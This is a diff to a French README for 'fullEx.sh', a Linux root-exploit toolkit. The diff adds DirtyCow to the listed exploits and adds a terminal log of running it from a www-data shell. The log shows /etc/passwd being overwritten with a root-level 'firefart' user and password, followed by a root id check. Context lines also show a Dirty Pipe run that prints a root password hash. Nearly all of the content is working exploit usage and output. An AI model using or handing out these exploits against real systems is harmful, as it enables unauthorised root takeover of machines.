@@ -3,6 +3,8 @@
 
 Les exploits root & outils dispo :
 
+💀 DirtyCow
+
 💀 DirtyPipe
 
 💀 OverlayFS
@@ -138,4 +140,43 @@ www-data@university:/tmp/fullEx$ ./fullEx.sh -DirtyPipe
 [Dirty Pipe] You can connect as root with password 'el3ph@nt!'
 [Dirty Pipe] Program execution completed successfully.
 root:$6$9WETWbCBTQ8pxg4I$odZAx8iIlayCnFdUwDM5dHVfsXXZo1RHRp2a4uQzcPDkRiTJYLA4loZESihn4ASGhWKN9.RWPT.CZJdyfTej4/:0:0:root:/root:/bin/sh
+```
+# 💀 DirtyCow
+
+```
+www-data@ubuntu:/tmp/fullEx$ ./fullEx.sh -DirtyCow
+./fullEx.sh -DirtyCow
+[+] Compilation successfuly !
+[+] PATH=/tmp/fullEx/exploits/DirtyCow/dcow
+[+] Executing the binary...
+Please enter the new password: azerty
+
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Complete line:
+firefart:ficJjR.juFRg6:0:0:pwned:/root:/bin/bash
+
+mmap: 7fdfeb990000
+ptrace 0
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password 'azerty'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Complete line:
+firefart:ficJjR.juFRg6:0:0:pwned:/root:/bin/bash
+
+mmap: 7fdfeb990000
+madvise 0
+
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password 'azerty'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+Binary file (standard input) matches
+
+firefart@ubuntu:~# id
+id
+uid=0(firefart) gid=0(root) groups=0(root)
 ```
